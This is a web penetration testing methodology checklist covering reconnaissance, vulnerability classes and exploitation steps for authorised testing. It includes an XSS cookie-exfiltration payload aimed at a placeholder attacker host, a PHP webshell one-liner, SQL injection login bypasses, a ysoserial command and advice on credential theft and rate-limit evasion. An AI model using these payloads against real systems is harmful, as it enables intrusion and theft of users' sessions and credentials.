# Web Penetration Testing Methodology

## 1. Pre-Engagement
- See [methodology.md](methodology.md)

## 2. Information Gathering & Reconnaissance

### Technology Fingerprinting
See the following command references for syntax and examples:
- [WhatWeb / Banner Grabbing commands](commands.md#whatweb--banner-grabbing)

1. **Identify the web server** — Apache, Nginx, IIS, LiteSpeed; version info from headers, error pages, and default files
2. **Identify backend language/framework** — PHP, ASP.NET, Python/Flask/Django, Ruby, Node.js; check file extensions, headers, cookies, and error messages
3. **Identify CMS** — WordPress, Joomla, Drupal, etc.; check `/wp-login.php`, `/administrator`, meta generators, and page source
4. **Check HTTP response headers** — `Server`, `X-Powered-By`, `X-Generator`, `X-AspNet-Version` often leak version and technology info
5. **Check cookies** — cookie names and formats reveal frameworks (e.g., `PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`, `laravel_session`)
6. **Check page source and comments** — developers often leave version numbers, paths, and debug info in HTML comments
7. **Use Wappalyzer / WhatWeb** — automated technology detection tools for quick fingerprinting
8. **Check for default files** — `/robots.txt`, `/sitemap.xml`, `/crossdomain.xml`, `/.well-known/` often reveal paths and structure
9. **Identify WAF presence** — unusual response codes, altered error pages, or blocked payloads indicate a WAF; identify vendor for bypass research

### Directory & File Enumeration
See the following command references for syntax and examples:
- [ffuf](commands.md#ffuf)
- [gobuster](commands.md#gobuster)
- [feroxbuster](commands.md#feroxbuster-recursive)

1. **Run a directory brute-force** — use gobuster, feroxbuster, or ffuf with SecLists wordlists to discover hidden directories and files
2. **Use multiple wordlists** — run with common.txt first, then directory-list-2.3-medium; different lists find different paths
3. **Enumerate file extensions** — fuzz for `.php`, `.asp`, `.aspx`, `.txt`, `.bak`, `.old`, `.zip`, `.conf`, `.log` in discovered directories
4. **Check for backup files** — append `.bak`, `.old`, `~`, `.swp`, `.orig` to known filenames; backups often contain source code
5. **Recurse into discovered directories** — run enumeration again on every discovered directory; hidden functionality is often nested
6. **Check for admin panels** — `/admin`, `/administrator`, `/manager`, `/portal`, `/dashboard`, `/console`, `/backend`
7. **Look for API endpoints** — `/api/`, `/api/v1/`, `/v1/`, `/swagger`, `/api-docs`, `/graphql`
  - Enumerating for endpoints should include the above with possible entities like `users`, `settings`, `orders`, `files`, etc...
9. **Check for sensitive files** — `.git/`, `.env`, `config.php`, `web.config`, `settings.py`, `database.yml`, `id_rsa`

### Virtual Host & Subdomain Discovery
See the following command references for syntax and examples:
- [ffuf vhost fuzzing](commands.md#ffuf)
- [gobuster DNS/vhost modes](commands.md#gobuster)

1. **Enumerate subdomains** — use ffuf or gobuster DNS mode with SecLists subdomains wordlist
2. **Fuzz for virtual hosts** — use ffuf with the `Host` header to discover vhosts on the same IP that aren't in DNS
3. **Check certificate SANs** — SSL certificates often list multiple vhosts; check with `openssl` or crt.sh
4. **Test discovered vhosts** — each vhost is a separate attack surface; enumerate them all independently
5. **Check for dev/staging environments** — `dev.`, `staging.`, `test.`, `beta.`, `internal.` subdomains often have weaker security

### Spidering & Crawling
1. **Spider the application** — use Burp Suite's spider or similar to map all reachable pages and endpoints
2. **Capture all requests in Burp** — proxy all traffic through Burp Suite to build a complete sitemap
3. **Identify all input vectors** — note every form, URL parameter, cookie, and header that accepts user input
4. **Check JS files for endpoints** — JavaScript often contains hardcoded API endpoints, internal paths, and sensitive tokens
5. **Extract endpoints from JS** — use tools like LinkFinder or manually review JS bundles for hidden endpoints
6. **Check for AJAX calls** — dynamic applications make background requests; capture these in Burp and test them independently

### CMS Enumeration
1. **WordPress** — run WPScan to enumerate version, plugins, themes, and users; check `/wp-json/wp/v2/users` for user enumeration
2. **Joomla** — check `/administrator`, run Joomscan; enumerate components and extensions for CVEs
3. **Drupal** — check `/CHANGELOG.txt` for version; use droopescan; enumerate modules
4. **Generic CMS** — check for known default credentials, unauthenticated functionality, and version-specific CVEs for any identified CMS
5. **Check CMS plugins/extensions** — third-party plugins are a primary vulnerability source; enumerate and research each one

### API Enumeration
1. **Find API documentation** — check `/swagger`, `/api-docs`, `/openapi.json`, `/graphql` for self-documenting APIs
2. **Enumerate API endpoints** — fuzz for common API paths; use API-specific wordlists
3. **Test all HTTP methods** — try GET, POST, PUT, DELETE, PATCH, and OPTIONS on discovered endpoints; unexpected methods may work
4. **Check for API versioning** — `/v1/`, `/v2/` — older versions may lack security controls present in newer versions
5. **Enumerate GraphQL** — use introspection queries to dump the full schema; all types, queries, and mutations
6. **Check for unauthenticated endpoints** — test API endpoints without authentication tokens; broken object-level auth is common

### Source Code Exposure & Git Enumeration
1. **Check for exposed `.git` directory** — request `/.git/HEAD`; if it returns a valid response, the full git repo may be accessible
2. **Dump the git repository** — use git-dumper or gittools to reconstruct the full source code from an exposed `.git` directory
3. **Review git history** — check commit history for removed credentials, API keys, debug code, and sensitive changes (`git log`, `git show`)
4. **Check for other VCS directories** — test for `/.svn/`, `/.hg/`, `/.bzr/` — other version control systems may also be exposed
5. **Check for `.DS_Store` files** — macOS metadata files can reveal directory structure even without directory listing
6. **Check for IDE and editor artifacts** — `.idea/`, `.vscode/`, `nbproject/` directories may contain project configs and credentials
7. **Search source code for secrets** — once source is obtained, grep for `password`, `secret`, `key`, `token`, `api_key`, database connection strings

### Parameter Discovery & Fuzzing
1. **Fuzz for hidden GET parameters** — use ffuf or Arjun to discover undocumented parameters on known endpoints
2. **Fuzz for hidden POST parameters** — test POST endpoints for undocumented parameters that may alter behavior or reveal functionality
3. **Test parameter pollution** — send the same parameter multiple times with different values; applications may process one while displaying another
4. **Fuzz JSON body keys** — for API endpoints, fuzz JSON property names to discover undocumented fields
5. **Check for debug/dev parameters** — test for `debug=true`, `test=1`, `admin=true`, `dev=1` — sometimes enable hidden functionality
6. **Test for mass assignment parameters** — submit extra parameters like `role`, `admin`, `is_admin`, `privilege` to object creation/update endpoints

### SSL/TLS Analysis
1. **Check SSL certificate details** — inspect issuer, subject, SANs, and validity dates; expired or self-signed certs are reportable
2. **Enumerate supported protocols** — check for SSLv3, TLS 1.0, TLS 1.1 support; these are deprecated and should not be in use
3. **Enumerate weak cipher suites** — identify export-grade, NULL, RC4, DES, or other weak ciphers
4. **Check for HSTS** — missing `Strict-Transport-Security` header means the site can be downgraded to HTTP
5. **Check for mixed content** — HTTPS pages loading HTTP resources are vulnerable to downgrade attacks
6. **Use testssl.sh or sslyze** — automated SSL/TLS analysis tools for comprehensive cipher and protocol enumeration
7. **Additional vhosts from SANs** — certificate SANs may reveal additional hostnames not found via other methods

### HTTP Security Headers Analysis
1. **Check `X-Frame-Options`** — missing or set to `ALLOW-FROM` enables clickjacking; should be `DENY` or `SAMEORIGIN`
2. **Check `Content-Security-Policy`** — absence or weak policy (`unsafe-inline`, `unsafe-eval`, wildcard sources) enables XSS escalation
3. **Check `X-Content-Type-Options`** — missing `nosniff` allows MIME-type sniffing attacks
4. **Check `Referrer-Policy`** — missing or overly permissive policy leaks sensitive URL parameters to third parties
5. **Check `Permissions-Policy`** — controls access to browser APIs (camera, mic, geolocation); missing header may be reportable
6. **Check `Strict-Transport-Security`** — missing HSTS allows HTTP downgrade; check `max-age`, `includeSubDomains`, and `preload`
7. **Use automated header analysis** — run the site through securityheaders.com or use curl to review all headers in one pass
8. **Cross-reference findings** — missing security headers are low/informational findings on their own but amplify the impact of other vulnerabilities

### Error Page & Debug Information Analysis
1. **Trigger 404 errors** — request non-existent paths to see the error handler; framework-specific error pages reveal technology stack
2. **Trigger 500 errors** — submit malformed input to force application errors; stack traces reveal file paths, line numbers, and framework versions
3. **Trigger 403 errors and attempt bypass** — use URL manipulation (`/admin/./`, `/admin%2f`, double slashes) to bypass access controls
4. **Check for debug mode** — some frameworks expose debug interfaces when `DEBUG=True`; Django, Flask, Laravel debug pages reveal source code
5. **Check for verbose error messages** — SQL errors, file path disclosure, and stack traces in error responses are both vulnerabilities and reconnaissance gold
6. **Test HTTP OPTIONS method** — send an `OPTIONS` request to the root and key endpoints; may reveal allowed methods including PUT and DELETE

## 3. Vulnerability Assessment

### SQL Injection
See the following command references for syntax and examples:
- [SQL Injection payloads](payloads.md#sql-injection-payloads)
- [Sqlmap Usage](commands.md)

1. **Test all input vectors** — URL parameters, form fields, cookies, HTTP headers (User-Agent, Referer, X-Forwarded-For)
2. **Check for error-based SQLi** — inject single quotes `'`, double quotes `"`, and comments `--`; look for database error messages
3. **Check for blind SQLi** — use boolean conditions (`AND 1=1`, `AND 1=2`) and time-based payloads (`SLEEP(5)`, `WAITFOR DELAY`) to infer injection
4. **Identify the database type** — MySQL, MSSQL, Oracle, PostgreSQL, SQLite each have different syntax and capabilities
5. **Test for second-order SQLi** — input stored and later used in a query without sanitization; common in profile/settings pages
6. **Test for NoSQL injection** — for MongoDB and similar, inject operators like `{"$ne": null}`, `{"$gt": ""}`, and `{"$where": "..."}` into JSON fields and URL params
7. **Use sqlmap for confirmation** — validate manual findings with sqlmap; use `--level` and `--risk` flags for thorough testing
8. **Assess impact** — determine what data is accessible, whether OS interaction is possible (xp_cmdshell, INTO OUTFILE), and privilege level

### Cross-Site Scripting (XSS)
See the following command references for syntax and examples:
- [XSS Payloads](payloads.md#xss-payloads)

1. **Test for reflected XSS** — inject `<script>alert(1)</script>` and variations into URL parameters and form fields; check if it reflects in the response
2. **Test for stored XSS** — inject payloads into persistent inputs (comments, profiles, usernames); check if they execute when viewed
3. **Test for DOM XSS** — review JS for dangerous sinks (`innerHTML`, `document.write`, `eval`, `location.href`); trace user-controllable sources into sinks
4. **Bypass filters** — try case variation, HTML encoding, JavaScript events, SVG payloads, and other filter evasion techniques
5. **Analyze Content Security Policy (CSP)** — check the `Content-Security-Policy` header; identify `unsafe-inline`, `unsafe-eval`, wildcard sources, and JSONP/Angular CSP bypasses
6. **Assess impact** — in a pentest context, XSS impact includes session hijacking, credential theft, keylogging, and CSRF bypass

### Local File Inclusion (LFI) / Remote File Inclusion (RFI)
See the following command references for syntax and examples:
- [LFI / Path Traversal Payloads](payloads.md#lfi--path-traversal-payloads)
- [PHP wrappers](payloads.md#php-wrappers)

1. **Identify file inclusion parameters** — look for parameters like `page=`, `file=`, `include=`, `path=`, `template=`
2. **Test for LFI** — attempt to read `/etc/passwd` (Linux) or `C:\Windows\win.ini` (Windows) via path traversal (`../../../etc/passwd`)
3. **Try path traversal variations** — URL encode (`%2f`), double encode, null byte (`%00`), and filter bypass techniques
4. **Attempt LFI to RCE** — via log poisoning (Apache/Nginx access logs), `/proc/self/environ`, PHP session files, or SSH authorized_keys
5. **Read sensitive files** — config files, source code, SSH keys, `/etc/shadow` with LFI before attempting RCE
6. **Test for RFI** — if the application fetches remote files, host a PHP shell and attempt inclusion via URL
7. **Check for PHP wrappers** — `php://filter` for source code disclosure, `php://input` for code execution, `data://` for arbitrary content

### Server-Side Request Forgery (SSRF)
1. **Identify SSRF candidates** — parameters that fetch URLs or resources: `url=`, `uri=`, `src=`, `path=`, `dest=`, `redirect=`, webhook URLs
2. **Test for basic SSRF** — point the parameter at your attack box; check if you receive a callback
3. **Probe internal services** — use SSRF to scan internal ports and services not accessible from outside (`http://127.0.0.1:PORT`)
4. **Access cloud metadata endpoints** — test `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP) for credential theft
5. **Bypass SSRF filters** — try alternative IP representations (decimal, hex, IPv6), URL redirects, and DNS rebinding
6. **Escalate to RCE** — SSRF against internal services (Redis, Memcached, Elasticsearch, Docker API) can lead to RCE

### XML External Entity (XXE)
See the following command references for syntax and examples:
- [XXE Payloads](payloads.md#xxe-payloads)

1. **Identify XML input** — any endpoint accepting XML; also test JSON endpoints that may accept XML with a content-type change
2. **Test for basic XXE** — inject an external entity referencing a local file (`file:///etc/passwd`)
3. **Test for blind XXE** — use out-of-band techniques (DNS/HTTP callbacks) when the response doesn't reflect the injected content
4. **Read sensitive files** — use XXE to read source code, configs, SSH keys, and other sensitive files
5. **Test for SSRF via XXE** — use external entities pointing to internal URLs to achieve SSRF
6. **Try error-based XXE** — trigger XML parsing errors that include file contents in the error message

### Insecure Direct Object Reference (IDOR) / Broken Access Control
1. **Identify object references** — look for IDs in URLs, parameters, and request bodies (user IDs, order IDs, document IDs)
2. **Test horizontal privilege escalation** — change your own ID to another user's ID; test if you can access their data
3. **Test vertical privilege escalation** — attempt to access admin-only functions or data as a regular user
4. **Test IDOR in all HTTP methods** — GET may be protected but POST/PUT/DELETE on the same resource may not be
5. **Test indirect references** — hashed or encoded IDs can sometimes be predicted or brute-forced
6. **Check for missing function-level access control** — directly access admin URLs, API endpoints, and functionality not shown in the UI
7. **Test parameter pollution** — add duplicate parameters or inject unexpected values to bypass access controls

### Authentication & Session Flaws
1. **Test for default credentials** — admin/admin, admin/password, and application-specific defaults
2. **Test for username enumeration** — different responses for valid vs invalid usernames in login, registration, and password reset
3. **Test for weak password policy** — attempt short, simple, or common passwords
4. **Test password reset functionality** — check for predictable tokens, token reuse, host header injection, and account takeover via email manipulation
5. **Analyze session tokens** — check for weak/predictable tokens, insufficient length, and lack of randomness; decode JWT tokens
6. **Test JWT security** — check for `alg:none` attack, weak secrets (crack with hashcat), and algorithm confusion attacks
7. **Test for session fixation** — does the session ID change after login?
8. **Check cookie security flags** — `HttpOnly`, `Secure`, and `SameSite` should be set; missing flags are reportable findings
9. **Test for concurrent session issues** — can the same account be logged in multiple times simultaneously?
10. **Test logout functionality** — does logout actually invalidate the session server-side?
11. **Test 2FA/MFA bypass** — attempt to skip the 2FA step entirely by navigating directly to post-auth pages; test for code reuse, response manipulation (`"success": false` → `true`), and backup code enumeration

### File Upload Vulnerabilities
1. **Identify file upload functionality** — profile pictures, document uploads, file managers, import features
2. **Test for unrestricted file upload** — attempt to upload a PHP/ASP/ASPX webshell directly
3. **Bypass extension filters** — try double extensions (`.php.jpg`), case variation (`.PHP`), alternative extensions (`.phtml`, `.php5`, `.phar`)
4. **Bypass MIME type checks** — change `Content-Type` header to `image/jpeg` while uploading a PHP file
5. **Bypass content checks** — prepend valid image magic bytes to a PHP file; some checkers only verify the first bytes
6. **Find the upload path** — determine where uploaded files are stored and whether they're web-accessible
7. **Test for path traversal in filename** — attempt to write files outside the intended upload directory
8. **Check for file overwrite** — can you overwrite existing files including `.htaccess` or `web.config`?

### Command Injection
See the following command references for syntax and examples:
- [Command Injection Filter Bypasses](payloads.md#command-injection-filter-bypasses)

1. **Identify OS command execution candidates** — features that ping, traceroute, run system commands, or process user-supplied filenames
2. **Test injection characters** — `;`, `&&`, `||`, `|`, `` ` ``, `$()`, newlines — inject after a valid value and before your command
3. **Test for blind command injection** — use `sleep 5` or `ping -c 5 127.0.0.1` to detect execution via time delay
4. **Use out-of-band for blind injection** — trigger a DNS or HTTP callback to `http://your-server/` to confirm execution
5. **Upgrade to a shell** — once injection is confirmed, inject a reverse shell payload
6. **Test in all input vectors** — form fields, URL parameters, HTTP headers, and file names

### Server-Side Template Injection (SSTI)
See the following command references for syntax and examples:
- [SSTI Payloads](payloads.md#ssti-payloads)

1. **Identify template engines** — Jinja2 (Python), Twig (PHP), Freemarker (Java), Pebble, Smarty, Mako — often revealed by errors
2. **Test for SSTI** — inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` and look for `49` in the response
3. **Identify the template engine** — different engines use different syntax; use a decision tree to identify the engine from responses
4. **Escalate to RCE** — each engine has known RCE payloads; look up the specific engine's exploitation chain
5. **Jinja2 RCE** — use class hierarchy traversal to access `os.system` or `subprocess` for command execution
6. **Check for sandbox escapes** — some apps run templates in a sandbox; research engine-specific sandbox escape techniques

### Cross-Site Request Forgery (CSRF)
1. **Identify state-changing actions without CSRF protection** — password change, email change, account deletion, money transfer
2. **Check for CSRF tokens** — if present, test if they're validated server-side, if they can be reused, or if the check can be bypassed
3. **Test for token absence bypass** — remove the token entirely and see if the request succeeds
4. **Test SameSite cookie bypass** — determine if SameSite=Lax or Strict is enforced; some CSRF attacks still work against Lax
5. **Check for CORS misconfigurations** — overly permissive CORS policies can enable CSRF-equivalent attacks via JavaScript

### Insecure Deserialization
1. **Identify serialized data** — look for base64-encoded blobs in cookies, parameters, and request bodies; Java (`rO0`), PHP (`O:`), .NET (`AAEAAAD`) indicators
2. **Test PHP deserialization** — look for `unserialize()` calls with user input; craft malicious objects using PHP gadget chains
3. **Test Java deserialization** — use ysoserial to generate payloads for common Java libraries (CommonsCollections, Spring, etc.)
4. **Test .NET deserialization** — use ysoserial.net for .NET gadget chains
5. **Test for Python pickle deserialization** — pickle objects with user input can execute arbitrary Python code
6. **Look for magic methods** — `__wakeup`, `__destruct`, `__toString` in PHP source code indicate deserialization attack surface

### Path Traversal
1. **Identify file retrieval parameters** — look for `file=`, `path=`, `download=`, `doc=`, `resource=` parameters that serve files
2. **Test for basic traversal** — inject `../../../etc/passwd` (Linux) or `..\..\..\windows\win.ini` (Windows)
3. **Try encoding bypasses** — URL encode (`%2e%2e%2f`), double encode (`%252e%252e%252f`), Unicode (`..%c0%af`), and mixed encoding
4. **Test with null bytes** — `../../../etc/passwd%00.jpg` may bypass extension validation on older systems
5. **Target high-value files** — `/etc/shadow`, `/etc/hosts`, SSH private keys, web app config files, `.env`, `web.config`, `database.yml`
6. **Test in archive extraction** — Zip Slip: upload a zip with `../` in filenames to write files outside the extract directory

### Open Redirect
1. **Identify redirect parameters** — look for `redirect=`, `next=`, `url=`, `return=`, `returnUrl=`, `continue=`, `dest=` in URLs and POST bodies
2. **Test for basic open redirect** — supply an external URL and check if the application redirects to it
3. **Bypass filter techniques** — try `//evil.com`, `\/\/evil.com`, `https:evil.com`, URL encoding, and adding a valid domain as a prefix (`/redirect?url=https://legitimate.com.evil.com`)
4. **Test post-auth redirects** — login pages often use redirect params; open redirect here enables credential theft via crafted login links
5. **Chain with OAuth flows** — redirect_uri open redirects in OAuth can leak authorization codes and tokens
6. **Document for phishing impact** — open redirects on trusted domains are high-value for phishing even without direct technical exploitation

### Clickjacking
1. **Check for missing `X-Frame-Options`** — if absent or set to `ALLOWALL`, the page can be embedded in an iframe on an attacker-controlled site
2. **Check for `frame-ancestors` in CSP** — `Content-Security-Policy: frame-ancestors 'none'` is the modern equivalent of X-Frame-Options; both should be checked
3. **Identify sensitive actions vulnerable to framing** — password change, fund transfer, account deletion, settings pages are high-impact clickjacking targets
4. **Craft a clickjacking PoC** — create an HTML page that iframes the target and overlays a deceptive UI element over the sensitive button to demonstrate impact
5. **Test with UI redressing** — use transparent iframe positioning to show that a victim could be tricked into clicking a sensitive action without knowing

### Host Header Injection
1. **Test password reset poisoning** — intercept a password reset request and modify the `Host` header to your attack server; if the reset link in the email uses the Host header, you receive the token
2. **Test for cache poisoning via Host header** — inject a malicious Host header and check if the response is cached and served to other users
3. **Test for virtual host routing manipulation** — some reverse proxies route based on Host header; try internal hostnames (`Host: localhost`, `Host: internal-admin`) to reach restricted vhosts
4. **Test `X-Forwarded-Host` and `X-Host` headers** — applications may trust override headers even when the Host header is validated; test both
5. **Test for SSRF via Host header** — some applications make server-side requests using the Host header value; point it at an internal service or your callback server

### CORS Misconfiguration
1. **Check the `Access-Control-Allow-Origin` header** — if it reflects the `Origin` request header verbatim, the site is vulnerable to cross-origin data theft
2. **Test null origin** — send `Origin: null`; some configs trust null origin, which is exploitable via sandboxed iframes
3. **Test with credentials** — check if `Access-Control-Allow-Credentials: true` is set alongside a permissive origin policy; this allows cross-origin requests with cookies
4. **Test subdomain trust** — some apps trust all subdomains (`*.example.com`); find an XSS on any subdomain to exploit
5. **Craft a CORS PoC** — write a JavaScript snippet that makes a credentialed cross-origin request and exfiltrates response data to demonstrate impact

### HTTP Verb Tampering
1. **Identify access controls enforced by HTTP method** — some controls check only GET and POST; other methods (PUT, DELETE, HEAD, PATCH, TRACK, CUSTOM) may bypass them
2. **Test restricted endpoints with alternate verbs** — if GET `/admin/delete` is blocked, try POST, PUT, or a fabricated method
3. **Test HEAD requests** — HEAD often receives the same access as GET but returns no body; use it to confirm resource existence behind access controls
4. **Use arbitrary verb bypass** — some frameworks grant access when the method is unrecognized (e.g., `FOO /admin/resource`)
5. **Test for method override headers** — `X-HTTP-Method-Override: DELETE` or `X-Method-Override: PUT` in POST requests may override the method server-side

### OAuth 2.0 / SSO Vulnerabilities
1. **Identify OAuth flows in use** — check for `redirect_uri`, `code`, `state`, `access_token`, and `client_id` parameters indicating OAuth usage
2. **Test for missing state parameter** — absence of `state` enables CSRF against the OAuth flow; link a victim's account to attacker's OAuth identity
3. **Test for open redirect in redirect_uri** — if `redirect_uri` validation is weak, leak the authorization code to an attacker-controlled URL
4. **Test for redirect_uri bypass** — try path traversal, subdomains, and URL parameter manipulation to redirect to unauthorized URIs
5. **Test implicit flow token leakage** — in implicit flow, tokens appear in URL fragments; check if Referer headers or browser history could leak them
6. **Test for account takeover via email claim** — if the OAuth provider allows unverified emails, register an attacker-controlled account with victim's email
7. **Test SAML vulnerabilities** — for SAML SSO, test for XML signature wrapping, comment injection in NameID, and XXE in SAML responses

### Business Logic Flaws
1. **Understand the intended workflow** — map out multi-step processes (checkout, registration, password reset) and test each step independently
2. **Test for step skipping** — attempt to access later steps in a workflow without completing earlier ones
3. **Test for negative/zero values** — input negative quantities, zero prices, or negative prices in financial operations
4. **Test for race conditions** — rapidly submit the same request multiple times; concurrent execution may bypass one-time checks
5. **Test coupon/discount abuse** — apply the same code multiple times, stack discounts, or reuse expired codes
6. **Test for mass assignment** — submit unexpected parameters to object creation/update endpoints; may allow privilege escalation

## 4. Exploitation

### SQL Injection Exploitation
1. **Extract database information** — enumerate database name, version, users, and schema via UNION or error-based techniques
2. **UNION-based extraction** — determine number of columns, find string columns, then extract data via UNION SELECT
3. **Error-based extraction** — use database-specific error functions to extract data in error messages
4. **Blind boolean extraction** — use conditional queries to extract data character by character
5. **Time-based blind extraction** — use conditional time delays to extract data when no other output is available
6. **Use sqlmap for bulk extraction** — automate data extraction once injection is confirmed; use `--dump`, `--tables`, `--columns`
7. **MSSQL xp_cmdshell** — if SA or sysadmin, enable and use xp_cmdshell for OS command execution
8. **MySQL INTO OUTFILE** — write a PHP webshell to the web root if FILE privilege and web root path are known
9. **Read files with LOAD_FILE** — read sensitive server files if MySQL FILE privilege is granted

### IDOR / Access Control Exploitation
1. **Map what data is accessible** — enumerate all objects reachable by manipulating IDs; document the scope of exposure (all users? all orders? admin data?)
2. **Access other users' sensitive data** — retrieve PII, financial records, private messages, or account details belonging to other users to demonstrate real impact
3. **Escalate to account takeover** — if the IDOR exposes password reset tokens, email change functionality, or session tokens, escalate to full account takeover
4. **Test write/delete IDOR** — attempt to modify or delete other users' data via PUT/PATCH/DELETE requests; write IDORs have higher impact than read IDORs
5. **Access admin objects** — attempt to access admin-only resources (user management, audit logs, system configs) by guessing or incrementing IDs into the admin range
6. **Chain with other vulnerabilities** — combine IDOR with privilege escalation, SSRF, or information disclosure to maximize impact for reporting
7. **Document with clear PoC** — capture the exact request and response showing access to another user's data; include the victim user ID and what data was exposed

### Authentication Bypass
1. **SQL injection in login** — inject `' OR '1'='1` and variations into username/password fields
2. **Password reset token abuse** — manipulate tokens, reuse tokens, or exploit host header injection in reset links
3. **JWT manipulation** — try `alg:none`, weak secret brute-force, or RS256→HS256 algorithm confusion
4. **Default credentials** — try known defaults for the identified application and framework
5. **Forced browsing** — access authenticated pages directly without going through login; check if authorization is enforced
6. **Cookie manipulation** — modify role, admin, or privilege values in cookies; check for base64-encoded values
7. **OAuth/SSO abuse** — test for redirect_uri manipulation, state parameter bypass, and token leakage
8. **Response manipulation** — intercept authentication responses in Burp; change `"authenticated": false` → `true`, `"role": "user"` → `"admin"`, or HTTP 302 → 200 to bypass client-side auth checks

### File Upload Exploitation
1. **Upload a webshell** — use a minimal PHP shell (`<?php system($_GET['cmd']); ?>`) or equivalent for the target language
2. **Find the webshell location** — check upload paths revealed in responses, source code, or via directory enumeration
3. **Test execution** — access the uploaded file and pass a test command to confirm execution
4. **Upgrade to a reverse shell** — use the webshell to execute a reverse shell payload for an interactive session
5. **ASP/ASPX shells for IIS** — use appropriate shell format for Windows/IIS targets
6. **Upload `.htaccess`** — on Apache, upload a `.htaccess` file that treats `.jpg` as PHP to bypass extension filters

### LFI to RCE
See the following command references for syntax and examples:
- [LFI / Path Traversal Payloads - Log poisoning and wrapper techniques](payloads.md#log-poisoning--user-agent-injection)

1. **Log poisoning** — inject PHP code into User-Agent or other logged fields, then include the log file via LFI
2. **PHP session file inclusion** — inject PHP code into a session value, then include `/var/lib/php/sessions/sess_<id>`
3. **`/proc/self/environ` inclusion** — inject PHP code into the HTTP_USER_AGENT environment variable, then include via LFI
4. **PHP filter for source disclosure** — use `php://filter/convert.base64-encode/resource=` to read source code without execution
5. **`data://` wrapper RCE** — use `data://text/plain;base64,<base64-encoded-php>` to execute arbitrary PHP
6. **`pearcmd.php` inclusion** — if PEAR is installed, include `/usr/local/lib/php/pearcmd.php` with a crafted `+config-create` query string to write a webshell to disk

### Command Injection Exploitation
See the following command references for syntax and examples:
- [Reverse Shells](payloads.md#reverse-shells)
- [Command Injection Filter Bypasses](payloads.md#command-injection-filter-bypasses)

1. **Confirm injection point and OS** — run `id` (Linux) or `whoami` (Windows) to confirm execution and identify user
2. **Establish a reverse shell** — use bash, python, perl, or powershell reverse shell one-liners depending on OS
3. **Upgrade the shell** — stabilize the reverse shell using the Shell Handling steps in methodology.md
4. **Test for filtered characters** — if some characters are blocked, use alternatives (`${IFS}` for spaces, hex encoding, etc.)

### SSRF Exploitation
See the following command references for syntax and examples:
- [SSRF exploitation commands](commands.md)

1. **Scan internal network** — use SSRF to probe `http://192.168.x.x:PORT` for internal services
2. **Access internal APIs** — reach internal admin panels, metadata endpoints, and management interfaces
3. **Cloud metadata theft** — retrieve IAM credentials from `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
4. **SSRF to RCE via Redis** — send Redis commands via SSRF to write SSH keys or cron jobs
5. **SSRF via DNS rebinding** — bypass IP-based SSRF filters by using a domain that resolves to an internal IP after the check
6. **Gopher protocol exploitation** — use `gopher://` URLs to send raw TCP payloads; attack Redis (`gopher://127.0.0.1:6379/...`), Memcached, SMTP, and other non-HTTP services via SSRF

### SSTI Exploitation
See the following command references for syntax and examples:
- [SSTI Payloads - Jinja2, Twig, Freemarker, and ERB RCE chains](payloads.md#ssti-payloads)

1. **Confirm RCE with id/whoami** — once the engine is identified, use the appropriate RCE payload to confirm code execution
2. **Jinja2 RCE chain** — traverse Python class hierarchy to reach `os.popen` or `subprocess.Popen`
3. **Twig RCE** — use `_self.env.registerUndefinedFilterCallback` or equivalent for RCE in PHP Twig
4. **Establish a reverse shell** — use the SSTI RCE to execute a reverse shell payload

### XSS Exploitation
See the following command references for syntax and examples:
- [XSS Payloads - Cookie theft and filter bypass techniques](payloads.md#xss-payloads)

1. **Cookie theft** — use `document.cookie` to exfiltrate session cookies to your attack server: `<script>fetch('http://ATTACKER/steal?c='+document.cookie)</script>`
2. **Session hijacking** — capture the victim's session cookie and import it into your browser to take over their session
3. **Credential harvesting via phishing overlay** — inject a fake login form over the page to capture credentials; useful for stored XSS on login pages
4. **Keylogging** — inject a JavaScript keylogger that exfiltrates keystrokes to your server
5. **BeEF hooking** — hook the victim's browser with BeEF for advanced exploitation (internal network scanning, browser exploitation, social engineering)
6. **CSRF via XSS** — use XSS to perform CSRF attacks that would otherwise be blocked by SameSite cookies since the request originates from the target origin
7. **DOM manipulation** — modify page content to redirect victims, display fake messages, or alter functionality
8. **Exfiltrate page content** — read sensitive page content (tokens, API keys, hidden fields) and send to your server

### XXE Exploitation
See the following command references for syntax and examples:
- [XXE Payloads - File read, OOB exfiltration, and SSRF techniques](payloads.md#xxe-payloads)

1. **Basic file read** — use a DOCTYPE with an external entity pointing to `file:///etc/passwd` or `file:///c:/windows/win.ini`
2. **Out-of-band (OOB) exfiltration** — use a DTD hosted on your server to exfiltrate file contents via DNS or HTTP when the response doesn't reflect output
3. **Error-based XXE** — trigger XML parsing errors that include file contents in the error message when OOB is unavailable
4. **SSRF via XXE** — use external entities pointing to `http://169.254.169.254/` or internal service URLs
5. **PHP file wrappers in XXE** — use `php://filter/convert.base64-encode/resource=` in entity definitions to read PHP source via XXE
6. **XXE via file upload** — upload SVG, DOCX, XLSX, or PPTX files containing XXE payloads; these formats are XML-based and often parsed server-side

### Deserialization Exploitation
1. **Java deserialization** — identify the vulnerable library from the classpath or error messages; use ysoserial to generate payloads: `java -jar ysoserial.jar CommonsCollections6 'id' | base64`
2. **Select the right gadget chain** — try multiple ysoserial payloads (CommonsCollections1-7, Spring, Hibernate) until one executes; library version matters
3. **PHP deserialization** — identify classes with `__wakeup`, `__destruct`, or `__toString` magic methods in the source code; craft a malicious serialized object leveraging those methods
4. **.NET deserialization** — use ysoserial.net with appropriate formatters (BinaryFormatter, JSON.NET, LosFormatter) to generate exploit payloads
5. **Python pickle** — craft a pickle payload with a `__reduce__` method that executes OS commands
6. **Confirm RCE** — use time-based or OOB callbacks first (DNS lookup, sleep) to confirm execution before running destructive commands
7. **Upgrade to a reverse shell** — once RCE is confirmed, use the deserialization payload to execute a reverse shell

### Password Attacks on Web
See the following command references for syntax and examples:
- [Hashcat](commands.md#hashcat)
- [Hydra](commands.md#hydra-online-brute-force)
- [Kerbrute](commands.md#kerbrute)

1. **Brute-force login with Hydra** — use `hydra -L users.txt -P passwords.txt http-post-form` for form-based login; adapt the failure string to match the app
2. **Brute-force with Burp Intruder** — capture the login request in Burp; use Intruder with Sniper or Cluster Bomb attack to iterate credentials
3. **Credential stuffing** — use breach credential lists against the login form; many users reuse passwords across services
4. **Username enumeration first** — enumerate valid usernames before password attacks to reduce the search space
5. **Bypass rate limiting** — try distributing requests, adding delays, rotating IPs/proxies, manipulating `X-Forwarded-For` header, or using different User-Agent strings
